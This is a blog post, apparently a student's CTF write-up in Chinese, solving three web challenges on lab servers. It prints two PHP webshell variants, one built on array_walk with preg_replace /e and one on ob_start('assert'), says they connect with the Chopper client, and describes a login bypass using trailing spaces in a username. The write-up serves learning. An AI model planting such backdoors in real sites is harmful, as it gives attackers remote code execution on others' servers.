<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> week 9 for cnas writeup · Uknow - Stay hungry Stay foolish</title><meta name="description" content="week 9 for cnas writeup - uknow"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/2.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><div id="mask" style="display: none;"><img id="mask-image" src="#" style=" "></div><div class="wrap"><header><a href="/" class="logo-link"><img src="/2.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">Blog</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">Archive</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">About</a></li><li class="nav-list-item"><a href="https://github.com/uknowsec" target="_blank" class="nav-list-link">GitHub</a></li><li class="nav-list-item"><a href="http://weibo.com/uknowsec" target="_blank" class="nav-list-link">Weibo</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">week 9 for cnas writeup</h1><div class="post-time">Jan 16, 2018</div><div class="post-content"><!-- ttoc -->
<h2><span id="01-50">01 50</span><a href="#01-50" class="header-anchor">#</a></h2><h3><span id="ti-mu-lian-jie">题目链接</span><a href="#ti-mu-lian-jie" class="header-anchor">#</a></h3><p><a href="http://47.100.121.220:28001/01.php" target="_blank" rel="noopener">http://47.100.121.220:28001/01.php</a></p>
<h3><span id="jie-da">解答</span><a href="#jie-da" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">show_source(__FILE__); </span><br><span class="line">highlight_file(&apos;about.php&apos;); </span><br><span class="line">?&gt; &lt;?php </span><br><span class="line">$e = $_REQUEST[&apos;a&apos;]; </span><br><span class="line">$arr = array($_POST[&apos;b&apos;] =&gt; &apos;|.*|e&apos;,); </span><br><span class="line">array_walk($arr, $e, &apos;&apos;);</span><br></pre></td></tr></table></figure>
<p>如上代码，是一个PHP木马。是可以用菜刀连接的。</p>
<p>这里用到array_walk函数</p>
<p>array_walk() 函数对数组中的每个元素应用用户自定义函数。在函数中，数组的键名和键值是参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_walk(array,myfunction,userdata...)</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>array</td>
<td style="text-align:center">必需。规定数组。</td>
</tr>
<tr>
<td>myfunction</td>
<td style="text-align:center">必需。用户自定义函数的名称。</td>
</tr>
<tr>
<td>userdata,…</td>
<td style="text-align:center">可选。规定用户自定义函数的参数。您能够向此函数传递任意多参数。</td>
</tr>
</tbody>
</table>
<p>网上给的是用assert函数，但是这里用assert不行。然后在学长的提醒下，这里提到|e，</p>
<p>所以可以用preg_replace函数.</p>
<p>如下图构造菜刀连接</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/09_1.png" alt=""></p>
<p>或者直接hackbar</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/09_2.png" alt=""></p>
<h2><span id="02-100">02 100</span><a href="#02-100" class="header-anchor">#</a></h2><h3><span id="ti-mu-lian-jie">题目链接</span><a href="#ti-mu-lian-jie" class="header-anchor">#</a></h3><p><a href="http://47.100.121.220:28002/index.php" target="_blank" rel="noopener">http://47.100.121.220:28002/index.php</a></p>
<h3><span id="jie-da">解答</span><a href="#jie-da" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">show_source(__FILE__); </span><br><span class="line">echo &quot;&lt;/br&gt;&quot;; </span><br><span class="line">highlight_file(&apos;about.php&apos;); </span><br><span class="line">echo &quot;&lt;/br&gt;&quot;; </span><br><span class="line">highlight_file(&apos;echo.php&apos;); </span><br><span class="line">?&gt; </span><br><span class="line">&lt;?php </span><br><span class="line">ob_start(&apos;assert&apos;); </span><br><span class="line">echo $_REQUEST[&apos;pass&apos;]; </span><br><span class="line">ob_end_flush(); </span><br><span class="line">//关键缓存每5分钟清理一次。&lt;/br&gt; </span><br><span class="line">&lt;?php </span><br><span class="line">include &quot;func.php&quot;; </span><br><span class="line"></span><br><span class="line">$your_real_ip = real_ip(); </span><br><span class="line">$path = &quot;temp/&quot;.$your_real_ip.&quot;_http_request_history.txt&quot;; </span><br><span class="line"></span><br><span class="line">$url = &apos;http://&apos;.$_SERVER[&apos;HTTP_HOST&apos;].$_SERVER[&apos;REQUEST_URI&apos;]; </span><br><span class="line">echo $your_real_ip.&quot;&lt;/br&gt;&quot;; </span><br><span class="line">echo $url; </span><br><span class="line"></span><br><span class="line">$fout = null; </span><br><span class="line">if(file_exists($path)) &#123; </span><br><span class="line">    $fout = fopen($path, &quot;ab&quot;) or die(&quot;Unable to open file!&quot;); </span><br><span class="line">&#125; </span><br><span class="line">else &#123; </span><br><span class="line">    $fout = fopen($path, &quot;wb&quot;) or die(&quot;Unable to open file!&quot;); </span><br><span class="line">&#125; </span><br><span class="line">fwrite($fout, $url.&quot;\n&quot;); </span><br><span class="line">fclose($fout); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这里也提到了一种PHP木马的写法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ob_start(&apos;assert&apos;); </span><br><span class="line">echo $_REQUEST[&apos;pass&apos;]; </span><br><span class="line">ob_end_flush();</span><br></pre></td></tr></table></figure>
<p>ob_start(“assert”)的意思设置assert作为ob操作结束时回调函数，</p>
<p>这个PHP木马是没有回显的</p>
<p>但是在给出的echo.php的代码有给出一些提示</p>
<p>这里说到的是temp文件夹是有写的权限的。</p>
<p>所以如下执行</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/09_3.png" alt=""></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/09_4.png" alt=""></p>
<h3><span id="login-100">login 100</span><a href="#login-100" class="header-anchor">#</a></h3><h3><span id="ti-mu-lian-jie">题目链接</span><a href="#ti-mu-lian-jie" class="header-anchor">#</a></h3><p><a href="http://47.100.121.220:28003/" target="_blank" rel="noopener">http://47.100.121.220:28003/</a></p>
<h3><span id="jie-da">解答</span><a href="#jie-da" class="header-anchor">#</a></h3><p>这个题目注册完账号登录后会提示你</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">您已登录成功，但只有nari用户才可以看到flag.</span><br></pre></td></tr></table></figure>
<p>这里根本没有任何思路的，然后学长告诉我。</p>
<p>注册nari后加个空格就可以了，我一脸懵逼。他也不知道为什么？</p>
<p>所以我注册nari加两个空格进去了，拿到flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a3afa127cfb57f423c7bc019587031020a2ce630&#125;</span><br></pre></td></tr></table></figure></div></article></div></section><footer><div class="paginator"><a href="/posts/life/Summary-of-2017.html" class="prev">PREV</a><a href="/posts/ctf/month-2-for-cnas-writeup.html" class="next">NEXT</a></div><div class="copyright"><p>© 2016 - 2019 <a href="https://uknowsec.cn">uknow</a>  Stay hungry,Stay foolish.</p></div></footer></div><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-115504647-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?225ebcce29d319519ac7c7690425d1d4";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>